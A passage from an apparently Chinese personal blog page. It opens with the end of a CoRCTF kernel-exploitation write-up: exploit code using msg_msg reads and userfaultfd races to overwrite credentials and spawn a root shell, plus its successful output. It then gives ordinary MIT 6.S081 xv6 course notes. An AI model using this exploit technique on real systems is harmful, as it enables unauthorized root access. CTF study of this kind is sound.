  fake_msg_header.next=page_msg;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x10</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    <span class="comment">//4.然後再把釋放掉的msg的段申請回來，這次他是msg了,並且再次通過userfault卡住</span></span><br><span class="line">    pthread_create(&amp;td[<span class="number">3</span>],<span class="literal">NULL</span>,get_page_msg,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">0</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">1</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">2</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">3</span>],<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid:%d\n&quot;</span>,getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有概率成功，主要是越界读的slab的内容不可控，可能能读到可能读不到，应该和slab的freelist的随机化有关。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ctf@CoRCTF:/$ /myexp</span><br><span class="line"> msg_queue_addr:0xffffa041855bf6c0 </span><br><span class="line"> page_msg_addr:0xffffa041855c1000 </span><br><span class="line"> kernelbase_addr:0xffffffff9ea00000 </span><br><span class="line"> init_task_addr:0xffffffff9f6124c0 </span><br><span class="line"> init_cred_addr:0xffffffff9f633060 </span><br><span class="line"> pid:0  getpid:86 </span><br><span class="line"> pid:86  getpid:86 </span><br><span class="line"> current_task_addr:0xffffa04186128ac0 </span><br><span class="line">[+] handler_write_task created</span><br><span class="line">[+] handler_write_msg created</span><br><span class="line">[*] page fault 1 at page1+0x1000</span><br><span class="line">get_page_msg</span><br><span class="line">[+] page fault 2 at page2+0x1000</span><br><span class="line">write msg ok</span><br><span class="line">[*] msg next write is ok</span><br><span class="line">write task ok</span><br><span class="line"> debug</span><br><span class="line">uid:0</span><br><span class="line">root@CoRCTF:/<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>利用msg进行越界读和任意读还是很好用的，但注意得开启<code>MSG_COPY</code>,但是通过msg进行任意写还得配合<code>userfault</code>,但在高版本中只有root用户才能使用<code>userfault</code>，所以感觉利用msg进行任意读在真实场景中不好实现的。</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>在本题的利用中，除了uaf以外还提供了写接口，我在想是否继续压缩条件，不使用这个写接口，而是通过把这个uaf转化成一个doublefree然后使用一个通解完成利用，我在其他博客中见到过类似思路，感觉是可行的，试试看。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/17/mit6-081%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E5%8F%8A%E5%AE%9E%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/17/mit6-081%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E5%8F%8A%E5%AE%9E%E9%AA%8C/" class="post-title-link" itemprop="url">mit6.081操作系统课程及实验</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-10-17 23:45:13" itemprop="dateCreated datePublished" datetime="2022-10-17T23:45:13+08:00">2022-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-10-25 01:14:03" itemprop="dateModified" datetime="2022-10-25T01:14:03+08:00">2022-10-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="mit6-s081"><a href="#mit6-s081" class="headerlink" title="mit6.s081"></a>mit6.s081</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学习了一段时间的kernelpwn后，发现自己对于操作系统理解的还是十分浅薄，遂想浅浅深入学习一下，然后从a3大佬得知mit的操作系统课程十分之好便下定决心跟着过一遍，本来是想学习mit6.828的，但不管教材还是视频全是洋文，而我的洋文能力着实有限，幸好我找见了mit6.s081版，也在网上找见了翻译版，还有诸多博客可以答疑，感觉可行，那就开干！</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>课程使用的是git进行代码管理和版本控制的，可笑我到目前为止只熟悉<code>git close</code>,所以再开始之前得了解一下git的命令。</p>
<p>看了几个小时，大概能使用了。</p>
<h3 id="RSIC-V指令集"><a href="#RSIC-V指令集" class="headerlink" title="RSIC-V指令集"></a>RSIC-V指令集</h3><p>……此处省略好多字</p>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>我使用的是最新的ubuntu22,其实完全不用搜什么搭建环境教程的，课程的网页已经非常清楚了（他推荐的是ubuntu20.4），按照它所述一步一步来就好了，可惜我意识到这一点的时候已经浪费了一两个小时了</p>
<p>准备完环境最激动人心的就是实验调试环境解了，调试我参考的是这篇文章<a target="_blank" rel="noopener" href="https://xistor.github.io/post/6.s081/xv6-gdb/">qemu xv6 使用GDB调试 - xistor’s notes</a></p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220806173357404.png" alt="image-20220806173357404"></p>
<p>我在ls上下了断点，可见成功截住了。</p>
<p>从这篇文章中了解到了关于<del>/.gdbinit文件的使用，可以向这个文件中写入gdb命令，当gdb执行的时候会在当前用户的主目录下寻找<code>.gdbinit</code>文件然后执行其中的命令，当你想要gdb执行不在当前用户的主目录下的<code>.gdbinit</code>的时候，可以在`</del>/.gdbinit<code>文件中导入，例如</code>add-auto-load-safe-path /home/x/xv6-labs-2021/.gdbinit<code>,这样做的话调试的时候就非常方便了，只需要键入</code>gdb-multiarch`就可以直接设置架构并连接qemu了。</p>
<h2 id="Lecture"><a href="#Lecture" class="headerlink" title="Lecture"></a>Lecture</h2><h4 id="Lecture1"><a href="#Lecture1" class="headerlink" title="Lecture1"></a>Lecture1</h4><p>讲了一点操作系统大体作用以及结构，然后通过几个例子示范了系统调用，其中比较有收获的是fork+exec两个系统调用的搭配可以在子进程重新载入一个新程序，所以原来的子进程被完全取代，一般情况下exec函数不会返回。值得注意的是exec()后的程序的文件描述符并没有重置，还是和源程序一样，利用这个特性可以完成一些骚操作。</p>
<p>总体比较简单。这节课有课后实验，我看课程介绍好像可以在本地测试自己的实验并打出分数，吆西，明天看看怎么整。</p>
<h4 id="Lecture3"><a href="#Lecture3" class="headerlink" title="Lecture3"></a>Lecture3</h4><p><strong>隔离性</strong>：操作系统提供进程和进程之间的墙隔离以及进程和硬件资源的强隔离，隔离的手段是进行抽象，提供系统调用接口。</p>
<p><strong>防御性</strong>：首先得具有错误处理能力，如果用户态进程使用系统调用的时候传入了错误的参数，内核得具有处理这种错误的能力，其次是应用程序不能破坏隔离性，这里的隔离指进程和内核的隔离，想要实现这种隔离性得需要硬件支持，比如内核模式和用户模式以及虚拟内存。</p>
<p><strong>user/kernel</strong>:当cpu运行在kernel模式中就会拥有执行特权指令的权限，特权指令指直接操作硬件的指令，相对的运行在user模式只能执行非特权指令，当user模式下执行特权指令时cpu并不会真正去执行，而是从user跳到kernel，内核获得cpu控制权，然后让内核判断user是否出现了问题是否改杀死。</p>
<p><strong>user-&gt;kernel</strong>:有专门的的一个指令可以从user到kernel,在x86下是syscall,在本次课程中的risc-v中是<code>ecall</code>，系统调用号存储在<code>a0</code>寄存器中。</p>
<p><strong>宏内核&amp;微内核</strong>：相比起宏内核，微内核的诸多服务都运行在user模式，在普通进程想要使用这些服务的时候通知内核，内核再通知服务，这样会导致User和kernel的切换比较频繁。</p>
<h4 id="Lecture4"><a href="#Lecture4" class="headerlink" title="Lecture4"></a><strong>Lecture4</strong></h4><blockquote>
<p>对虚拟内存的看法</p>
<p>在我看来虚拟内存主要有两点，一点是完美的进程隔离，每个进程都有自己的页表，不会访问到其他进程的页表，二是不直接操作物理内存，也就是硬件，会比较好的保护硬件</p>
</blockquote>
<p>risc-v虚拟内存简单理解：和x86很类似，也有一个mmu路由对cpu想要访问的虚拟地址进行翻译，翻译成物理内存，<code>stap</code>寄存器就存放着进程的页表的物理地址，也表中就存放着虚拟内存到物理内存的映射，mmu就通过访问stap来进行翻译</p>
<p><strong>页表设计</strong></p>
<p>在xv6操作系统中虚拟地址的前25位并没有被使用，所以尽管寄存器是64位，物理地址是56位，但其寻址空间还是2^39，在这39位中前27位是索引，后12位是偏移。</p>
<p>xv6的页表设计是采用三级页表的，不像x86的四级页表，之所以采用三级页表，是因为一个页表占用4k,每一个页表项所占用的内存是2^3,所以一个页表可以有2^9个页表，27/9=3,所以三个页表就完全够映射所有的索引了。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220824152319391.png" alt="image-20220824152319391"></p>
<p>每一个页表项是64位其中最高的10位并没有被使用，因为没必要，然后后44位记录页编号（因为一共只有2^44个页），然后后10位记录一些标志，用来标识这个页表项。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220824153329033.png" alt="image-20220824153329033"></p>
<p><strong>TLB</strong></p>
<p>采用三级页表的话得到一个具体的物理地址就需要访问访问内存三次，这是非常昂贵的，所以就像x86有缓存一样，xv6也有缓存，也叫作TLB，储存着最近访问的虚拟地址到物理地址之间的映射。</p>
<p>在xv6操作系统中似乎还没有实现多个进程使用同一个TLB,所以当切换进程的时候也需要刷新TLB防止映射出错。TLB还是一个硬件，并不由操作系统具体控制。</p>
<p><strong>虚拟地址分布和物理地址分布</strong></p>
<p>物理内存的分布都是有设计者控制的，并不由操作系统控制，在物理内存下面的那些位置并不是真实存在于内存中的，而是一种映射，比如中断或者io什么的。</p>
<p>为了让xv6操作系统能够比较简单简约，虚拟地址都是采用恒等映射的。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220824160019857.png" alt="image-20220824160019857"></p>
<p>上面的虚拟地址分布似乎只是内核虚拟地址分布，内核会在<code>free memory</code>中为进程分配空间，下面是进程的虚拟地址分布</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220824164115781.png" alt="image-20220824164115781"></p>
<h4 id="Lecture5"><a href="#Lecture5" class="headerlink" title="Lecture5"></a><strong>Lecture5</strong></h4><p>本节课程主要是讲解<code>risc-v</code></p>
<p>在gdb中输入<code>tui enable</code>就能进入一个界面，在界面中输入<code>layout asm</code>或者<code>layout reg</code>，<code>layout src</code>就能查看汇编或者寄存器的值或者源代码了。如果想要聚焦某个窗口就可以输入<code>focus xxx</code></p>
<p>终于学会了怎么自动开多个shell平铺到桌面了，首先输入<code>tmux</code>,打开一个shell,在打开一个shell就是先同时按<code>ctrl+b</code>然后单独按<code>c</code>,然后可以使用<code>ctrl+b</code>+p/n来切换shell窗口，可以使用<code>ctrl b</code>+<code>shift+%</code>切出新窗口，然后使用<code>ctrl+b</code>+o来切换窗口。</p>
<p>使用<code>bt</code>可以查看调用栈</p>
<p>条件断点命令<code>b xxx if i==5</code></p>
<p>寄存器表</p>
<p>a0<del>a7可以存放函数调用参数，a0</del>a1可以存放返回值</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220901133841549.png" alt="image-20220901133841549"></p>
<h5 id="risc-v的函数调用"><a href="#risc-v的函数调用" class="headerlink" title="risc-v的函数调用"></a>risc-v的函数调用</h5><p>和记忆中mips的函数调用很类似，risc-v中有一个寄存器专门用来记录这个函数的返回地址，当执行<code>ret</code>的函数，就会把pc指向<code>ra</code>寄存器保存的地址，但是ra寄存器只有一个，但是函数a可以调用函数b,当执行函数b的时候，ra寄存器指向函数b的返回值，但是函数b也可以调用函数c,当执行函数c的时候ra保存函数c的返回值，当返回到函数b的时候，ra还是指向了函数c的返回值，这样就会造成死循环了，所以risc-v就有一个策略，当指向非叶子函数（也就是这个函数还会调用其他函数），就会把ra保存到栈里，当函数返回的时候先把栈里的返回地址加载到ra中再执行<code>ret</code>指令，当执行叶子函数的时候，就不会在栈里保存ra寄存器了，当执行<code>ret</code>的时候直接加载<code>ra</code>寄存器。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220901210847634.png" alt="image-20220901210847634"></p>
<h4 id="Lecture6"><a href="#Lecture6" class="headerlink" title="Lecture6"></a>Lecture6</h4><p>在内核态的时候权限提升主要体现在两点，一点是可以读写控制寄存器，第二点是可以可以使用没有<code>pte_u</code>的页表。</p>
<p>这是sh程序的页表，可以清晰的看见虚拟地址到物理地址的映射，比较有收获的就是，设置了u权限的页表，用户态才可以使用，其次是陷阱帧trapframe虽然每个进程都有自己的一份，但是所有进程的虚拟地址都是一样的<code>#define TRAPFRAME (TRAMPOLINE - PGSIZE)</code>。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220906160934534.png" alt="image-20220906160934534"></p>
<p>在执行<code>ecall</code>的时候会关闭中断，这样就不会发生进程切换了，然后在执行<code>sret</code>的时候又会打开中断，如果不进行其他操作，当用户态程序陷入内核态的时候并不会发生进程切换，但是这样做并不适合所有情况，当进行系统调用的时候就可以进程切换，打开中断和关闭中断的函数分别是<code>intr_on()</code>和<code>intr_off()</code>，当执行完系统调用的时候又会关闭中断。</p>
<h4 id="Lecture8"><a href="#Lecture8" class="headerlink" title="Lecture8"></a>Lecture8</h4><p><strong>页面错误(page faults)</strong></p>
<p>其实可以利用页面错误配合虚拟内存来完成好多有意思的事情，比如说fork的写时复制或者惰性分配。</p>
<p>在发生页面错误时我们可以知道三个信息，首先是错误地址，得知道错误地址才能去处理他，这个错误地址就保存在<code>stval</code>寄存器中，第二点就是得知道页面错误的类型，这个类型就存储在<code>scause</code>寄存器中。第三件点得知道引起页面错误的指令的虚拟地址，这个地址就存储在<code>sepc</code>中。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908204934721.png" alt="image-20220908204934721"></p>
<p><strong>惰性分配</strong></p>
<p>惰性分配实际就是一个空头支票，并不分配物理内存和映射，而是先增大p-&gt;sz,当使用这段内存的时候才根据<code>scause</code>的值确定页面错误类型然后分配内存并且映射，所以在srbk中并不需要映射，而是增大p-&gt;sz的值就可以了，大概思路如下图代码，比较好理解</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908210855042.png" alt="image-20220908210855042"></p>
<p>但是这样又会导致另一个错误，当惰性分配后，可能的情况就是有些真的分配了，有的没有分配，当释放这个进程的内存的就是后就会发生如下bug</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908211459524.png" alt="image-20220908211459524"></p>
<p>简单的解决方案就是释放进程内存的时候条件放的宽松一点，原本的uvnunmap是如果检测到了不存在的映射直接<code>panic</code>,我们可以修改成<code>continue</code></p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908211750910.png" alt="image-20220908211750910"></p>
<p>很熟悉的bss段也可以利用惰性分配，类似下图，先让bss全部映射到一个只有读权限的页面，当有一个地址想要写入内容的时候就会触发页面错误，进而可以给他分配一个新的页面。<img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908213940714.png" alt="image-20220908213940714"></p>
<p><strong>COW</strong></p>
<p>copy on write，也就是fork的写时复制技术，当fork的时候，把父子进程都映射到原先父进程的物理内存上，但是他们都是<code>r</code>。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220908221824481.png" alt="image-20220908221824481"></p>
<p>然后当子进程想要在这段内存中写入内容时就会发生页表错误，然后可以重新申请一个页面，把发生错误的页面的内容复制到新申请的页面上，然后把这个页面映射到子进程中，原先错误的虚拟地址就指向了这个新的页面，然后把父进程的权限变成<code>rw</code>,然后重新执行发生页面错误的指令。</p>
<p>但是如果使用往一个只读页面中写入内容来判断是否是写时复制其实是不准确的，因为有些页面本来就是只读内容，这样就会破坏这些页面的内容了。在pte中还存在一位叫做<code>RSW</code>,可以把这一位设置成是否是<code>cow</code>页面的标志。</p>
<p>上述的<code>cow</code>策略并不完美，当一个父进程fork了多个子进程之后，父进程exit的话显然不能直接释放父进程的页面，因为所有子进程都指向这些页面，所以得给每个页面加个引用计数，当计数为0的时候才会真正释放这个页面。</p>
<p><strong>按需分配</strong></p>
<p>按需分配是内存扩展的精髓，当在内存中加载文件时并不是全部都加载进去，而是按需加载，然后当内存用完之后再驱逐一些近期不用的页面腾出空间。</p>
<h4 id="Lecture9"><a href="#Lecture9" class="headerlink" title="Lecture9"></a>Lecture9</h4><h5 id="book-read"><a href="#book-read" class="headerlink" title="book read"></a>book read</h5><p>这一节是关于中断的，以前总是对中断模模糊糊的，不是很清楚，通过阅读本节内容和网上的资料，终于对中断有了一个较为清晰的概念了。</p>
<p>中断其实就是在CPU正在做某件事的时候，收到了通知告诉CPU你要放下手头现在做的事，去处理另一件事（当然这个是立即处理还是过一会处理以及如何处理取决于中断的类型）。可以先把中断分为两种，一种是外部中断，一种是内部中断。</p>
<p>外部中断也叫硬件中断，由硬件向cpu发出中断信号，然后cpu停下来处理这个中断，此时cpu是知道是那个设备发出的中断的，有个中断号，然后根据这个中断号调用对应的中断驱动程序对这个中断完成处理，这样一看cpu就像一个后端一样，根据请求信息处理对应事件。</p>
<p>内部中断就是指cpu内部出现的中断，系统调用就是内部中断。</p>
<h5 id="课程内容"><a href="#课程内容" class="headerlink" title="课程内容"></a>课程内容</h5><p>当通上电以后，设备也是在运行的，cpu也是在运行的，两个可以说是在并行运行，既然是在并行运行，就需要处理两者之间的同步性问题，而中断就可以处理这个问题。</p>
<p>PCLI是cpu内部的一个模块，是对外部设备中断的管理者，</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220920231732880.png" alt="image-20220920231732880"></p>
<p>驱动程序分为上下两部分，下半部分是中断处理程序，上半部分在我看来是缓存区，比如<code>uart</code>设备的可以把接收或者发送的字符串放在上半部分，然后就可以完成了设备和cpu的解耦。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220920233006328.png" alt="image-20220920233006328"></p>
<p><code>$ ls</code>的工作过程，看的不是很懂，关于uart的部分。</p>
<p>后续,稍微理解了uart，他是一个用于辅助计算机和设备通信的芯片，当计算机向设备发送数据的时候，通过uart串口把字节转换成一位一位的，然后设备把一位一位的数据传递给计算机的时候，通过uart串口把一位一位的数据转化成字节流传递给计算机。</p>
<p>打印<code>$</code>的流程就是先把<code>$</code>放入到uart的一个寄存器中，然后产生一个中断，把储存的字符发送到另一个uart中，这个uart链接到了虚拟控制台。</p>
<p>发送<code>ls</code>时，首先键盘会把字符发送到与之链接的uart上，然后uart发送数据到另一个uart上，这个uart拿到数据后就会产生一个中断，告诉计算器键盘输出了字符。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220921001534980.png" alt="image-20220921001534980"></p>
<p>当中断要被某一个cpu处理的时候，这个cpu对应寄存器的变化如下</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221005194949276.png" alt="image-20221005194949276"></p>
<p>中断有点难理解，课上的内容半懂不懂的，有时间看看源码再理解一下吧。</p>
<h4 id="Lecture10"><a href="#Lecture10" class="headerlink" title="Lecture10"></a>Lecture10</h4><p>这节课的主要内容是锁</p>
<p>需要锁的主要原因就是cpu是多核的，每个核都可能有一个程序流，这些程序流可能访问同一个共享数据，内核中就有很多全局数据结构，当多个进程在不同核心上运行然后同时进入系统调用就可能发生同时访问共享数据的问题。总而言之就是解决并行性系统中访存共享数据的问题。</p>
<p>锁会序列化操作，即可以控制并行系统关于同一个共享数据的访问顺序，通一个时刻内，只有一个核可以访问共享数据段，当然，这势必会造成性能损失。</p>
<p>比如freelist就可能造成条件竞争。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221010104133931.png" alt="image-20221010104133931"></p>
<p>在xv6中关于锁主要有两个函数调用<code>acquire()</code>和<code>release()</code>，第一个函数是获得锁，第二个函数是释放锁。</p>
<p>锁可以有粗粒度锁和细粒度锁</p>
<p>锁可以解决条件竞争的问题，但是也会带来自己的问题，也就是众所周知的死锁问题。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221011001902538.png" alt="image-20221011001902538"></p>
<p>加锁这个过程必须是原子序列的，在xv6中，使用的是amoswap指令完成加锁，原理就是amoswap会对addr这个地址加锁，然后执行完后面三个后再解锁，最后判断r2的值来判断是否获得锁了。如果等于0就是获得锁，如果等于1就是没有获得锁，秒啊。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221011010830326.png" alt="image-20221011010830326"></p>
<p>老师提到的一个解决死锁问题的办法是把所有锁进行一个排序，然后进程获得多个锁的时候就按照这个顺序来获取，这样确实可以避免比较典型的死锁问题。但是排序问题似乎也很麻烦，需要一个好的策略。</p>
<p>锁对性能肯定会造成损失，要想尽可能不造成损失，只能尽可能对把共享数据结构细化，然后锁就能尽可能的细粒度，性能就能损失的尽可能少，但是这是非常复杂的，系统越大越不好实现，老师给出的观点是先使用粗粒度的锁，然后看有没有条件竞争，再细化锁。</p>
<p>所有核心想要进行内存操作都会经过一个内存控制器，硬件锁就是利用此完成对特定地址加锁，让执行几步操作后对此解锁。</p>
<h4 id="Lecture11"><a href="#Lecture11" class="headerlink" title="Lecture11"></a>Lecture11</h4><h5 id="book-read-1"><a href="#book-read-1" class="headerlink" title="book-read"></a>book-read</h5><p><strong>上下文切换</strong></p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221011163736314.png" alt="image-20221011163736314"></p>
<p>每个cpu都有自己的调度程序线程以及调度程序栈，其上下文保存在cpu-&gt;context中，当shell进程切换到cat进程的时候，首先在shell的内核线程中调用<code>yield()</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">yield</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  acquire(&amp;p-&gt;lock);</span><br><span class="line">  p-&gt;state = RUNNABLE;</span><br><span class="line">  sched();</span><br><span class="line">  release(&amp;p-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先把当前进程的状态位改成<code>RUNNABLE</code>,然后调用<code>sched()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">sched</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> intena;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!holding(&amp;p-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;sched p-&gt;lock&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(mycpu()-&gt;noff != <span class="number">1</span>)</span><br><span class="line">    panic(<span class="string">&quot;sched locks&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;state == RUNNING)</span><br><span class="line">    panic(<span class="string">&quot;sched running&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(intr_get())</span><br><span class="line">    panic(<span class="string">&quot;sched interruptible&quot;</span>);</span><br><span class="line"></span><br><span class="line">  intena = mycpu()-&gt;intena;</span><br><span class="line">  swtch(&amp;p-&gt;context, &amp;mycpu()-&gt;context);</span><br><span class="line">  mycpu()-&gt;intena = intena;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要就是调用了<code>swtch()</code>函数来保存上下文并恢复调度线程上下文，执行调度线程。</p>
<p>swtch中主要就是sd和ld,当最后执行ret的时候就返回到了调度程序线程上下文了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">000000008000267a &lt;swtch&gt;:</span><br><span class="line">    8000267a:	00153023          	sd	ra,0(a0)</span><br><span class="line">    8000267e:	00253423          	sd	sp,8(a0)</span><br><span class="line">    80002682:	e900                	sd	s0,16(a0)</span><br><span class="line">    80002684:	ed04                	sd	s1,24(a0)</span><br><span class="line">    80002686:	03253023          	sd	s2,32(a0)</span><br><span class="line">    8000268a:	03353423          	sd	s3,40(a0)</span><br><span class="line">    8000268e:	03453823          	sd	s4,48(a0)</span><br><span class="line">    80002692:	03553c23          	sd	s5,56(a0)</span><br><span class="line">    80002696:	05653023          	sd	s6,64(a0)</span><br><span class="line">    8000269a:	05753423          	sd	s7,72(a0)</span><br><span class="line">    8000269e:	05853823          	sd	s8,80(a0)</span><br><span class="line">    800026a2:	05953c23          	sd	s9,88(a0)</span><br><span class="line">    800026a6:	07a53023          	sd	s10,96(a0)</span><br><span class="line">    800026aa:	07b53423          	sd	s11,104(a0)</span><br><span class="line">    800026ae:	0005b083          	ld	ra,0(a1)</span><br><span class="line">    800026b2:	0085b103          	ld	sp,8(a1)</span><br><span class="line">    800026b6:	6980                	ld	s0,16(a1)</span><br><span class="line">    800026b8:	6d84                	ld	s1,24(a1)</span><br><span class="line">    800026ba:	0205b903          	ld	s2,32(a1)</span><br><span class="line">    800026be:	0285b983          	ld	s3,40(a1)</span><br><span class="line">    800026c2:	0305ba03          	ld	s4,48(a1)</span><br><span class="line">    800026c6:	0385ba83          	ld	s5,56(a1)</span><br><span class="line">    800026ca:	0405bb03          	ld	s6,64(a1)</span><br><span class="line">    800026ce:	0485bb83          	ld	s7,72(a1)</span><br><span class="line">    800026d2:	0505bc03          	ld	s8,80(a1)</span><br><span class="line">    800026d6:	0585bc83          	ld	s9,88(a1)</span><br><span class="line">    800026da:	0605bd03          	ld	s10,96(a1)</span><br><span class="line">    800026de:	0685bd83          	ld	s11,104(a1)</span><br><span class="line">    800026e2:	8082                	ret</span><br></pre></td></tr></table></figure>

<p>这个是<code>scheduler</code>函数，切换上下文后，就会执行<code>swtch</code>的下一条语句了，比较饶的就是获得锁和释放锁应该是一个进程干的事情，但是在调度的时候并不是这样，首先在<code>yield</code>中获得锁，然后在<code>scheduler</code>释放锁，目的保护进程不被其他cpu调度。看似形不成一个闭环，但其实是可以的。</p>
